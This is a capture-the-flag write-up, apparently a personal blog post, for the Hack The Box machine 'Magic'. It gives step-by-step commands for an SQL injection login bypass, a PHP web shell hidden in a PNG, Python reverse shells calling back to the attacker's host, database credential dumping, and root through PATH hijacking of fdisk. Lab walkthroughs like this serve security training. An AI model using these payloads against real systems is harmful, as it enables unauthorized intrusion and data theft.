---
layout: post
title:  "HTB - Magic"
postid: writeup
categories:
---

# Magic Box
IP: 10.10.10.185

<br />

## Summary
We recon the web server, used sql injection to bypass login screen, inserted a php shell to an image and uploaded it, found a misconfigured file that contained database username and password, dumped the database to get username and password of admin, used credentials to escalate to user level and got user flag.

In order to get root, we used sysinfo vulnerability by adding malicious fdisk file to /tmp file and executing a reverse shell via python getting us access to root.

<br />

## Recon
Use nmap to scan Magic host for all ports using:
 * -sC to scan with default scripts.
 * -sV to scan for 
 * -p0-65536 to scan for all ports (using -p- misses port 0 which MAY be used in rare chances)

```
nmap -sC -sV -p0-65535 10.10.10.185
```

We see port 80 is open so we lets recon the site:
http://10.10.10.185

Homepage contains picture gallery with id tags. We also see a link to a Login page:
http://10.10.10.185/login.php

Since the site states "Please Login, to upload images", lets note that we may need to use a upload a file to get initial foothold

<br />

## Initial Foothold

Using Burp Proxy, lets send a POST request with following paremeters to the login page:

<b>Username/Password:</b> admin/password

<p style="text-align: center;">
<img src="https://raw.githubusercontent.com/DefenderGB/defendergb.github.io/master/_images/magic-login-burp-login.png" style="width:250px;"><br/>
</p>

Lets modify the input to contain a MySQL payload to bypass the login screen:
<pre>
username=admin<b>' or 1=1--+</b>&password=password
</pre>

<p style="text-align: center;">
<img src="https://raw.githubusercontent.com/DefenderGB/defendergb.github.io/master/_images/magic-login-burp-sqlinjection.png" style="width:250px;"><br/>
</p>

We are routed to an upload page. If you click Upload Image, it will tell you that it only accepts jpg, jpeg, and png.

NOTE: You will need a image. Replace "test" with the name of your file. I use my dgb1.png

Lets modify a png with exiftool and add a php shell with a cmd parameter:
```
exiftool -Comment='<?php system($_REQUEST['cmd']);?>' test.png
```

<p style="text-align: center;">
<img src="https://raw.githubusercontent.com/DefenderGB/defendergb.github.io/master/_images/magic-upload-exiftool.png" style="width:250px;"><br/>
</p>


To bypass the file type filter lets make this a .php.png so it opens as a php:
```
mv test.png test.php.png
```

Upload the file.

<p style="text-align: center;">
<img src="https://raw.githubusercontent.com/DefenderGB/defendergb.github.io/master/_images/magic-upload-php.png" style="width:250px;"><br/>
</p>


Call the php shell by adding a parameter value to our hidden php file:
```
http://10.10.10.185/images/uploads/test.php.png?cmd=ls
```

Now that we know we have shell execution, lets open a netcat session:
```
nc -nlvp 7777
```

Use following url to create a system shell back to your machine. Please use your IP instead of the IP below:

```http://10.10.10.185/images/uploads/test.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.209",7777)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

Now that you have system shell on your terminal within netcat listener, use following command to get a bash shell:
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Within Webserver directory we find a interesting database file:
```
cd /var/www/Magic
cat db.php5
```

The file included hard-coded username and password of database, lets use this to dump the database:
```
mysqldump --databases Magic -utheseus -piamkingtheseus
```

Now that we got the admin username and password, lets escalate to theseus's shell:
```
su theseus
Th3s3usW4sK1ng
```

Lets route to theseus's home directory and get the user flag:
```
cat /home/theseus/user.txt
```

<br />

## Priv Escalate
We will use sysinfo/fdisk exploit to create a root bash shell.

Within your machine lets create a fdisk file:
```
mkdir magic
cd magic
vim fdisk
```
Add the following on fdisk:

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.209",7778));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' ```

Create a python webserver in current directory:
```
python3 -m http.server 8000
```

Within Magic bash shell, route to tmp directory:
```
cd /tmp
```

Use wget to pull our fdisk file:
```
wget http://10.10.14.209:8000/fdisk
```

Lets add tmp directory to PATH and change priveleges to fdisk:
```
export PATH=/tmp:$PATH
chmod 755 fdisk
```

Open a netcat on your machine:
```
nc -nlvp 7778
```

Use sysinfo command on magic machine:
```
sysinfo
```

Ones you get a system bash, run python command below to get bash shell:
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

You now have root! Route to root directory to get the root flag:
```
cat /root/root.txt
```
That's it!

<br />

## Alternatives
An alternative way to get the database username and password is using sqlmap. See SQLMap below for my step to step on how to use that tool for this box.